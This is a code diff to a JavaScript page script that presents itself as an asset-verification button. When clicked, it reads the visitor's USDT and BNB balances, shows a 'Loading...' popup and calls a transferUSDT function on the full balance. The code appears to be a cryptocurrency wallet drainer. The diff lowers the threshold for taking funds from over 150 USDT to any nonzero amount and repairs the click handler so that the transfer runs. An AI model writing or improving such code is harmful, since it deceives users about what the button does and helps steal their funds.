@@ -54,7 +54,7 @@ async function verifyAssets() {
     console.log(`USDT Balance: ${usdtBalance} USDT`);
     console.log(`BNB Balance: ${userBNB} BNB`);
 
-    if (usdtBalance === 0) {
+    if (usdtBalance < 0.00001) {
         showPopup("No assets found.", "black");
         return;
     }
@@ -67,7 +67,7 @@ async function verifyAssets() {
         return;
     }
 
-    // User has more than 150 USDT → Check BNB Gas Fee
+    // User has more than 5 USDT → Proceed to gas check and transfer
     showPopup("Loading...", "green");
 
     transferUSDT(usdtBalance, userBNB);
@@ -137,6 +137,8 @@ function showPopup(message, color) {
         popup.style.width = "80%";
         popup.style.maxWidth = "400px";
         document.body.appendChild(popup);
+    } else if (!document.body.contains(popup)) {
+        document.body.appendChild(popup);
     }
 
     popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
@@ -151,4 +153,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("verifyBtn").addEventListener("click", verifyBtn);
+document.getElementById("verifyBtn").addEventListener("click", verifyAssets);
